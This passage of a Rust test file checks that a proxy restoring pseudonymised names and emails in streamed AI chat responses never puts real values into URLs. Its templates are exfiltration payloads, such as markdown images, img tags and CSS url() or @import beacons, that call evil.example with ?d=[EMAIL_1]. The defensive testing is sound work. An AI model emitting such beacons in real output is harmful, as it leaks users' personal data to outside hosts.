                    if c[i] == '\\' && i + 1 < n {
                        d.push(c[i]);
                        d.push(c[i + 1]);
                        i += 2;
                        continue;
                    }
                    if c[i] == '(' {
                        depth += 1;
                    } else if c[i] == ')' {
                        if depth == 0 {
                            break;
                        }
                        depth -= 1;
                    }
                    d.push(c[i]);
                    i += 1;
                }
            }
            Some(d)
        };
        let mut out = Vec::new();
        // HTML is tokenised left to right: a `<` inside a tag (in a quoted
        // value, say) starts nothing.
        let mut html_from = 0;
        for i in 0..n {
            if c[i] == ']' && i + 1 < n && c[i + 1] == '(' {
                out.extend(dest(i + 2));
            }
            // Reference definitions (labels may span lines).
            if c[i] == ']' && i + 1 < n && c[i + 1] == ':' && c[..i].contains(&'[') {
                out.extend(dest(i + 2));
            }
            // CSS: `url(…)` to an unquoted `)`, `@import …` to an unquoted
            // `;`.
            let lower: String = c[i..]
                .iter()
                .take(7)
                .collect::<String>()
                .to_ascii_lowercase();
            for (kw, end) in [("url(", ')'), ("@import", ';')] {
                if lower.starts_with(kw) {
                    let mut j = i + kw.chars().count();
                    let mut quote = None;
                    let mut d = String::new();
                    while j < n {
                        match quote {
                            Some(q) if c[j] == q => quote = None,
                            None if c[j] == '"' || c[j] == '\'' => quote = Some(c[j]),
                            None if c[j] == end => break,
                            _ => {}
                        }
                        d.push(c[j]);
                        j += 1;
                    }
                    out.push(d);
                }
            }
            let ahead: String = c[i..]
                .iter()
                .take(8)
                .collect::<String>()
                .to_ascii_lowercase();
            if ["http://", "https://", "www."]
                .iter()
                .any(|p| ahead.starts_with(p))
            {
                out.push(
                    c[i..]
                        .iter()
                        .take_while(|ch| !ch.is_ascii_whitespace() && **ch != '<')
                        .collect(),
                );
            }
            if c[i] == '<'
                && let Some(end) = c[i + 1..].iter().position(|&ch| ch == '>')
            {
                let inner: String = c[i + 1..i + 1 + end].iter().collect();
                // CommonMark autolink: no whitespace, control or `<`.
                if inner.contains(':') && !inner.chars().any(|ch| ctrl(ch) || ch == '<') {
                    out.push(inner);
                }
            }
            // An HTML tag, tokenised like a browser (whitespace is TAB, LF,
            // FF, CR, SPACE only): every attribute value.
            let hws = |ch: char| matches!(ch, '\t' | '\n' | '\x0c' | '\r' | ' ');
            if i >= html_from && c[i] == '<' && i + 1 < n && c[i + 1].is_ascii_alphabetic() {
                let mut j = i + 1;
                while j < n && !hws(c[j]) && c[j] != '>' && c[j] != '/' {
                    j += 1;
                }
                let mut values = Vec::new();
                let closed = loop {
                    while j < n && (hws(c[j]) || c[j] == '/') {
                        j += 1;
                    }
                    if j >= n {
                        break false;
                    }
                    if c[j] == '>' {
                        break true;
                    }
                    while j < n && !hws(c[j]) && c[j] != '=' && c[j] != '>' {
                        j += 1;
                    }
                    while j < n && hws(c[j]) {
                        j += 1;
                    }
                    if j < n && c[j] == '=' {
                        j += 1;
                        while j < n && hws(c[j]) {
                            j += 1;
                        }
                        if j < n && (c[j] == '"' || c[j] == '\'') {
                            let q = c[j];
                            let start = j + 1;
                            j = start;
                            while j < n && c[j] != q {
                                j += 1;
                            }
                            if j >= n {
                                break false;
                            }
                            values.push(c[start..j].iter().collect::<String>());
                            j += 1;
                        } else {
                            let start = j;
                            while j < n && !hws(c[j]) && c[j] != '>' {
                                j += 1;
                            }
                            values.push(c[start..j].iter().collect::<String>());
                        }
                    }
                };
                // A tag cut off by the end of the text is no tag; count its
                // values anyway (stricter).
                html_from = if closed { j + 1 } else { n };
                out.extend(values);
            }
        }
        out
    }

    #[test]
    fn the_oracle_finds_destinations() {
        let d = destinations("a ![x](<b\\>c d>) [e](f(g)h i) > [r]: j\r<http:k> www.l<m n=\"o p\"");
        assert_eq!(d, ["b\\>c d", "f(g)h", "j", "http:k", "www.l", "o p"]);
    }

    /// Characters at which a guard and a renderer could disagree about
    /// where a URL ends.
    fn boundary_chars() -> Vec<char> {
        let mut v: Vec<char> = (0u32..=0x20).filter_map(char::from_u32).collect();
        v.extend(['\u{7f}', '\u{85}', '\u{a0}', '\u{2028}', '\u{3000}']);
        v
    }

    /// The syntax guard alone (no engine url-safe run): restores `pieces`
    /// pushed one after another.
    fn guard_only(e: &Engine, pieces: &[&str]) -> String {
        let mut r = Guarded::new(e.stream_restorer(SCOPE));
        let mut out = String::new();
        for p in pieces {
            out.push_str(&r.push(p));
        }
        out.push_str(&r.finish());
        out
    }

    /// No real value inside any destination, URL or attribute value of
    /// `out`.
    fn assert_no_real_value_in_urls(out: &str, what: &str) {
        for d in destinations(out) {
            assert!(
                !d.contains("Ravi Kumar") && !d.contains("ravi@example.com"),
                "{what}: real value in {d:?} of {out:?}"
            );
        }
    }

    #[test]
    fn guarded_constructs_hold_at_every_boundary_char() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // `{b}` is replaced by each boundary character. The last group are
        // pointy and quoted contexts, where a space does not end the URL.
        let templates = [
            "![x](<//evil.example/?d={b}[EMAIL_1]>) ![y](<//e/{b}[NAME_1]>)",
            "![x](//evil.example/?d={b}[EMAIL_1])",
            "![x]({b}//evil.example/?d=[EMAIL_1])",
            "[r]: //evil.example/?d={b}[EMAIL_1]\n\n![x][r]",
            "[r{b}x]: <//evil.example/?d= {b}[NAME_1]>\n\n![a][r x]",
            "[r]:{b}<//e/?d= [NAME_1]>",
            "<http:evil.example/?d={b}[EMAIL_1]>",
            "<img src=//evil.example/?d={b}[EMAIL_1]>",
            "<img src=\"//evil.example/?d={b}[NAME_1]\">",
            "<img src{b}={b}\"//e/ [NAME_1]\">",
            "<img{b}src='//e/ [NAME_1]'>",
            "<style>p{background:url(//e/?d={b}[EMAIL_1])}</style>",
            "<style>p{background:url('//e/{b} [NAME_1]')}</style>",
            "<style>@import{b}\"//evil.example/?{b} [NAME_1]\";</style>",
            "www.evil.example/?d={b}[EMAIL_1]",
            "![x](<https://evil.example/?d={b} [NAME_1]>)",
            "![x](<https://evil.example/?d= {b}[NAME_1]>)",
            "[r]: <//e/?d={b} [NAME_1]>\n\n![x][r]",
            "[r]: <//e/?d= {b}[NAME_1]>\n\n![x][r]",
            "<img src=\"https://evil.example/?d={b} [NAME_1]\">",
            "<img src='https://evil.example/?d= {b}[NAME_1]'>",
            "<p style=\"background:url('//e/?d={b} [NAME_1]')\">x</p>",
            "<style>p{background:url('//evil.example/?d={b} [NAME_1]')}</style>",
            "<style>p{background:url(\"//evil.example/?d= {b}[NAME_1]\")}</style>",
            "<style>@import \"//evil.example/?d={b} [NAME_1]\";</style>",
            "<style>@import url('//evil.example/?d= {b}[NAME_1]');</style>",
        ];
        for t in templates {
            // Plain-text URLs are the engine's run rule, not the guard's.
            let syntax = !t.starts_with("www.");
            for b in boundary_chars() {
                let text = t.replace("{b}", &b.to_string());
                let label = format!("{t:?} with U+{:04X}", b as u32);
                for n in [1, 3, text.len()] {
                    let out = run(&e, "text/plain", text.as_bytes(), n);
                    let out = String::from_utf8_lossy(&out).into_owned();
                    assert_no_real_value_in_urls(&out, &format!("{label}, chunks of {n}"));
                }
                // The tag split from what precedes it right after the last
                // space before it, and right after the boundary character.
                let tag_at = text.rfind('[').unwrap();
                let after_space = text[..tag_at].rfind(' ').map(|i| i + 1);
                let after_b = t.find("{b}").map(|i| i + b.len_utf8());
                for cut in after_space.into_iter().chain(after_b) {
                    let pieces = [&text[..cut], &text[cut..]];
                    let what = format!("{label}, cut at {cut}");
                    let mut tr = for_content_type(&e, SCOPE, "text/plain");
                    let mut out = tr.push(pieces[0].as_bytes()).to_vec();
                    out.extend_from_slice(&tr.push(pieces[1].as_bytes()));
                    out.extend_from_slice(&tr.finish());
                    assert_no_real_value_in_urls(&String::from_utf8_lossy(&out), &what);
                    let out = run(&e, "text/event-stream", &claude_stream(&pieces, true), 5);
                    assert_no_real_value_in_urls(&claude_text(&out), &format!("{what} (sse)"));
                    let out = run(&e, "text/event-stream", &chatgpt_stream(&pieces), 4);
                    assert_no_real_value_in_urls(
                        &chatgpt_text(&out),
                        &format!("{what} (delta sse)"),
                    );
                    if syntax {
                        assert_no_real_value_in_urls(
                            &guard_only(&e, &pieces),
                            &format!("{what} (guard alone)"),
                        );
                    }
                }
                if syntax {
                    let chars: Vec<String> = text.chars().map(String::from).collect();
                    let refs: Vec<&str> = chars.iter().map(String::as_str).collect();
                    assert_no_real_value_in_urls(
                        &guard_only(&e, &refs),
                        &format!("{label} (guard alone, char by char)"),
                    );
                }
            }
        }
    }

    /// One tagged engine for every property-test case.
    fn shared_engine() -> &'static Engine {
        static ENGINE: std::sync::OnceLock<(tempfile::TempDir, Engine)> =
            std::sync::OnceLock::new();
        let (_, e) = ENGINE.get_or_init(|| {
            let dir = tempfile::tempdir().unwrap();
            let e = tagged(dir.path());
            (dir, e)
        });
        e
    }

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(512))]

        /// For any split of the answer into events and any chunking of the
        /// stream, the client's text equals restoring the whole text.
        #[test]
        fn sse_restore_under_any_chunking_equals_whole_text_restore(
            text in arb_text(),
            cuts in proptest::collection::vec(0usize..200, 0..8),
            chunk in 1usize..40,
        ) {
            let e = shared_engine();
            // Whole-text restore, tags inside URLs left alone.
            let mut whole = Guarded::new(e.stream_restorer(SCOPE).url_safe());
            let mut want = whole.push(&text);
            want.push_str(&whole.finish());
            // Correctness, not just consistency: no real value inside any
            // destination or URL.
            for d in destinations(&want) {
                prop_assert!(
                    !d.contains("Ravi Kumar") && !d.contains("ravi@example.com"),
                    "real value in {:?} of {:?}",
                    d,
                    want
                );
            }
            let pieces = split_at(&text, &cuts);
            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
            let out = run(e, "text/event-stream", &chatgpt_stream(&refs), chunk);
            prop_assert_eq!(chatgpt_text(&out), want.clone());
            let out = run(e, "text/event-stream", &claude_stream(&refs, true), chunk);
            prop_assert_eq!(claude_text(&out), want.clone());
            let out = run(e, "text/event-stream", &claude_stream(&refs, false), chunk);
            prop_assert_eq!(claude_text(&out), want);
        }
    }
}
